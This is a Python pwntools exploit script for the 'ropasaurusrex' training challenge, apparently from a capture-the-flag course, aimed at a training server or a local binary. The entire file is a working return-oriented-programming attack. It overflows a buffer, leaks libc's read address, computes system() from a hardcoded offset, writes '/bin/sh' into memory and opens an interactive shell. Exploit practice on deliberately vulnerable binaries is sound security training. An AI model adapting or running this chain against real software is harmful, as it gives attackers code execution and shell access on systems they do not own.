from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"


if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 2014)
else:
	r = process("./ropasaurusrex")
#	gdb.attach(r, """
#	# dopo la read b *0x0804841b 
#	b *0x80483f4
#    unset env
#    set disable-randomization off	
#    c
#	""")

read_plt = 0x804832c
read_got = 0x0804961c
write_plt = 0x0804830c
main = 0x804841d
data = 0x08049620
pop_esi_edi_ebp = 0x80484b6
pop_eax_ebx_leave = 0x80482e8
gadget = pop_esi_edi_ebp

input("wait")
time.sleep(0.5)

r.send(b"a"*140 + p32(write_plt) + p32(gadget) + p32(0x01) + p32(read_got) + p32(0x4) + p32(main))
time.sleep(0.2)
read_libc = u32(r.recv(4))
print("read_libc: ", hex(read_libc))
system_libc = read_libc - 0xc1f70
print("system_libc: ", hex(system_libc))

r.send(b"a"*140 + p32(read_libc) + p32(gadget) + p32(0x00) + p32(data) + p32(0x08) + p32(main))
time.sleep(0.2)
r.send(b"/bin/sh\x00")

r.send(b"a"*140 + p32(system_libc) + p32(0x00) + p32(data))

r.interactive()
